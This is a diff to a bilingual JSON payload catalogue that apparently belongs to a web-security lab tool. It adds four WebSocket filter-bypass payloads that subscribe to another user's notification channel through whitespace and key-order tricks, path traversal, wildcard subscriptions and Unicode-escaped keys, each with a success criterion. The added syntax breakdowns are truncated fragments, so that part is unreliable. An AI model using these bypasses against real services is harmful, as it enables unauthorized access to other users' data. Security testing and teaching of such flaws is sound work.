@@ -58,7 +58,24 @@
                 "zh": "在 allow-scripts Sandbox 中仅设置本地 dataset marker，用于观察隔离上下文。",
                 "en": "Set only a local dataset marker inside an allow-scripts sandbox to observe the isolated context."
               },
-              "syntaxBreakdown": [],
+              "syntaxBreakdown": [
+                {
+                  "part": "<iframe id=\"frame\" sandbox",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<iframe id=\"frame\" sandb",
+                  "explanation": {
+                    "zh": "标记结构",
+                    "en": "Markup structure"
+                  },
+                  "type": "control"
+                }
+              ],
               "platform": "all",
               "requiresAdmin": false
             },
@@ -72,7 +89,24 @@
                 "zh": "加载本地 Sandbox 预览并记录 popup 与脚本权限，不执行逃逸或导航。",
                 "en": "Load the local sandbox preview and record popup and script permissions without escape or navigation."
               },
-              "syntaxBreakdown": [],
+              "syntaxBreakdown": [
+                {
+                  "part": "<iframe src=\"http://127.0.",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<iframe src=\"http://127.",
+                  "explanation": {
+                    "zh": "标记结构",
+                    "en": "Markup structure"
+                  },
+                  "type": "control"
+                }
+              ],
               "platform": "all",
               "requiresAdmin": false
             },
@@ -86,7 +120,32 @@
                 "zh": "拖拽 text/plain marker 到本地可编辑预览，验证输入路径而不注入 HTML。",
                 "en": "Drag a text/plain marker into a local editable preview to validate the input path without HTML injection."
               },
-              "syntaxBreakdown": [],
+              "syntaxBreakdown": [
+                {
+                  "part": "<div id=\"drag\" draggable=\"",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<iframe id=\"target\" src=",
+                  "explanation": {
+                    "zh": "载荷后续行",
+                    "en": "Payload next line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "<div id=\"drag\" draggable",
+                  "explanation": {
+                    "zh": "标记结构",
+                    "en": "Markup structure"
+                  },
+                  "type": "control"
+                }
+              ],
               "platform": "all",
               "requiresAdmin": false
             }
@@ -168,7 +227,124 @@
               "requiresAdmin": false
             }
           ],
-          "wafBypass": []
+          "wafBypass": [
+            {
+              "title": {
+                "zh": "消息键序与空白混淆",
+                "en": "Message key-order and whitespace confusion"
+              },
+              "command": "socket.send(JSON.stringify({ marker: \"WS_AUTHZ_B2\", action: \"subscribe\", channel: \"user.lab-other.notifications\" }));\nsocket.send('{\\n  \"action\"\\t:\\t\"subscribe\",\\n  \"channel\" : \"user.lab-other.notifications\",\\n  \"marker\":\"WS_AUTHZ_B2\"\\n}');\nsocket.send('  { \"action\" : \"subscribe\" , \"channel\" : \"user.lab-other.notifications\" }  ');",
+              "description": {
+                "zh": "绕过对 subscribe+他人频道字符串做字面匹配的消息过滤/WAF 规则：调整键序、插入换行/制表符/多余空白后 JSON 语义不变而签名失效；成功判据：服务端仍接受订阅并下发 other 频道消息（回执含 WS_AUTHZ_B2）。",
+                "en": "Bypasses message filters matching the literal subscribe + foreign-channel string: reordered keys and injected newline/tab/space padding keep JSON semantics while breaking signatures; success criterion: the subscription is still accepted and the foreign channel delivers messages (ack contains WS_AUTHZ_B2)."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "socket.send(JSON.stringify",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "socket.send('{\\n  \"actio",
+                  "explanation": {
+                    "zh": "载荷后续行",
+                    "en": "Payload next line"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "频道名路径变形与遍历",
+                "en": "Channel-name path variants and traversal"
+              },
+              "command": "socket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-other./notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user/./lab-other/notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user//lab-other//notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"User.Lab-Other.Notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-self/../lab-other/notifications\", marker: \"WS_AUTHZ_B2\"}));",
+              "description": {
+                "zh": "绕过以频道全字符串做授权比对或黑名单的校验：点段、双分隔符、大小写与 ../ 遍历写法在服务端规范化后仍解析到他人频道而字面不匹配；成功判据：任一变形订阅成功且能收到 lab-other 频道推送。",
+                "en": "Bypasses authorization comparing the full channel string: dot segments, doubled separators, case variance and ../ traversal normalize server-side to the foreign channel without literal match; success criterion: any variant subscribes successfully and receives lab-other pushes."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "socket.send(JSON.stringify",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "socket.send(JSON.stringi",
+                  "explanation": {
+                    "zh": "载荷后续行",
+                    "en": "Payload next line"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "通配符与前缀模式越权",
+                "en": "Wildcard and prefix pattern over-subscription"
+              },
+              "command": "socket.send(JSON.stringify({action: \"subscribe\", channel: \"user.*\", marker: \"WS_AUTHZ_WAF_V3\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-*\", marker: \"WS_AUTHZ_WAF_V3\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"user.lab-other.*\", marker: \"WS_AUTHZ_WAF_V3\"}));\nsocket.send(JSON.stringify({action: \"subscribe\", channel: \"*\", marker: \"WS_AUTHZ_WAF_V3\"}));",
+              "description": {
+                "zh": "绕过把通配符订阅当成普通频道的授权实现：若鉴权只在精确匹配分支拦截而通配/前缀分支放行，则用 user.* 或 * 一次订阅全部频道；成功判据：收到含 lab-other 内容的推送即证明通配分支未做对象级鉴权。",
+                "en": "Bypasses authorization that only guards exact channel names: if wildcard/prefix branches skip the object-level check, user.* or * subscribes to everything at once; success criterion: receiving lab-other traffic proves the wildcard branch lacks per-object authorization."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "socket.send(JSON.stringify",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "socket.send(JSON.stringi",
+                  "explanation": {
+                    "zh": "载荷后续行",
+                    "en": "Payload next line"
+                  },
+                  "type": "payload"
+                }
+              ]
+            },
+            {
+              "title": {
+                "zh": "Unicode 转义键与动作大小写变形",
+                "en": "Unicode-escaped keys and action-case variants"
+              },
+              "command": "socket.send('{\"\\u0061ction\":\"subscribe\",\"\\u0063hannel\":\"user.lab-other.notifications\",\"marker\":\"WS_AUTHZ_B2\"}');\nsocket.send(JSON.stringify({action: \"SUBSCRIBE\", channel: \"user.lab-other.notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({action: \"Subscribe\", channel: \"user.lab-other.notifications\", marker: \"WS_AUTHZ_B2\"}));\nsocket.send(JSON.stringify({Action: \"subscribe\", Channel: \"user.lab-other.notifications\", Marker: \"WS_AUTHZ_B2\"}));",
+              "description": {
+                "zh": "绕过按 \"action\":\"subscribe\" 字面或小写动作名匹配的过滤：JSON \\u 转义还原后键名相同、动作大小写被宽容归一，而过滤签名未覆盖这些形态；成功判据：转义/大小写变形消息仍触发订阅并被推送 other 频道消息。",
+                "en": "Bypasses filters keyed on the literal \"action\":\"subscribe\" or lowercase action names: JSON \\u escapes decode to the same keys and case-tolerant dispatch normalizes the action while signatures miss these forms; success criterion: an escaped or case-variant message still subscribes and receives the foreign channel."
+              },
+              "syntaxBreakdown": [
+                {
+                  "part": "socket.send('{\"\\u0061ction",
+                  "explanation": {
+                    "zh": "载荷首行",
+                    "en": "Payload first line"
+                  },
+                  "type": "payload"
+                },
+                {
+                  "part": "socket.send(JSON.stringi",
+                  "explanation": {
+                    "zh": "载荷后续行",
+                    "en": "Payload next line"
+                  },
+                  "type": "payload"
+                }
+              ]
+            }
+          ]
         }
       ],
       "toolTargets": [
